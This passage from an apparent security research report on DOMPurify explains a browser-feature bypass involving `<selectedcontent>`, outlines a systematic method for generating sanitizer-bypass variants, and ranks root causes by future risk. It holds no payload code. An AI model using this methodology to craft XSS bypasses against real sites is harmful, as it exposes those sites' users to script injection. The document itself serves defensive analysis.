DOMPurify walks the tree and sees the payload inside `<option>` but treats it as inert content (options don't render arbitrary HTML). Chrome then clones this content into `<selectedcontent>`, where it becomes live and executable.

**Fix**: DOMPurify 3.4.5+ adds `selectedcontent` to the forbidden tags list and removes it and its content during sanitization.

**Declarative partial updates** (proposed): Would allow server-sent HTML fragments to update specific parts of the page without full-page reloads. If these fragments bypass DOMPurify (because the update mechanism operates below the JavaScript layer), attacker-controlled server responses could inject unsanitized content.

**Variant discovery approach**:
- Monitor browser release notes for new HTML elements, attributes, and parsing behaviors
- Monitor WHATWG HTML spec changes (particularly the "scripting" and "parsing" sections)
- Test DOMPurify against browser canary/beta builds
- Track CSS specification changes that could affect `<style>` content parsing
- Track Web Components specification changes (declarative shadow DOM, custom element lifecycle)

**Forward projection**: HIGH risk. This is the root cause most likely to produce future bypasses. Browser vendors continuously add new features, and each feature may alter the assumptions DOMPurify relies on. The `<selectedcontent>` bypass demonstrates that a feature can completely invalidate DOMPurify's security model without any bug in DOMPurify itself.

## 16.2 Variant Analysis Methodology

For each root cause, the following systematic process identifies undiscovered variants:

### Step 1: Instance Enumeration
Collect all known instances (CVEs, HackerOne reports, blog posts, conference talks) of the root cause. Map each to:
- Affected DOMPurify version range
- Specific HTML construct that triggers the bypass
- Browser(s) required
- Configuration requirements

### Step 2: Pattern Generalization
Abstract the specific HTML construct to a pattern class:
- Which element types are involved?
- Which parsing phase is exploited?
- Which DOMPurify internal function is bypassed?
- What browser behavior is relied upon?

### Step 3: Variant Generation
For each pattern class, enumerate potential variants:
- Substitute elements of the same category (e.g., all rawtext elements for a rawtext bypass)
- Vary namespace context (HTML, SVG, MathML)
- Vary nesting depth and structure
- Introduce additional elements between the attacker-controlled outer element and the payload
- Test with different encoding (UTF-8, UTF-16, named entities, numeric entities)

### Step 4: Fix Evaluation
For each known fix:
- Is the fix point-specific (blocks the exact payload) or structural (addresses the root cause)?
- Does the fix introduce new assumptions that could be violated?
- Does the fix interact with other configuration options?
- Has the fix been tested against the generated variants?

### Step 5: Projection
Assess the likelihood of future variants:
- Is the root cause inherent to the architecture (serialize-reparse) or incidental (regex gap)?
- Does the browser feature landscape make new variants more or less likely?
- How quickly can DOMPurify respond to new variants (patch release cycle)?

## 16.3 Forward-Looking Assessment

### Root causes ranked by likelihood of producing future bypasses:

1. **Browser Feature Evolution** (Root Cause 8): HIGHEST risk. Continuous browser evolution guarantees new features that DOMPurify must account for. The `<selectedcontent>` case demonstrates that a single new element can completely bypass DOMPurify.

2. **Serialize-Parse Roundtrip Non-Idempotency** (Root Cause 1): HIGH risk. The fundamental architecture of string-output DOMPurify relies on roundtrip fidelity, which the HTML spec does not guarantee. New parser behaviors create new roundtrip mutations.

3. **IN_PLACE Mode Structural Issues** (Root Cause 4): HIGH risk. IN_PLACE mode operates on shared mutable state, creating an inherently fragile security boundary.

4. **Namespace Confusion** (Root Cause 2): MEDIUM risk. The three-namespace model is stable but complex. New integration points or namespace-sensitive elements could create new confusion vectors.

5. **Rawtext Element Regex Gaps** (Root Cause 7): MEDIUM risk. New elements with rawtext parsing modes, or changes to existing rawtext element behavior, can create new gaps.

6. **Configuration API Evaluation Order** (Root Cause 5): MEDIUM risk. Each new configuration option creates combinatorial interaction possibilities.

7. **Allowlist State Management** (Root Cause 6): MEDIUM risk. Hook-based extensibility inherently increases state management complexity.

8. **Prototype Pollution** (Root Cause 3): LOW risk for config pollution (comprehensive fixes in 3.x), MEDIUM risk for internal state pollution.

---
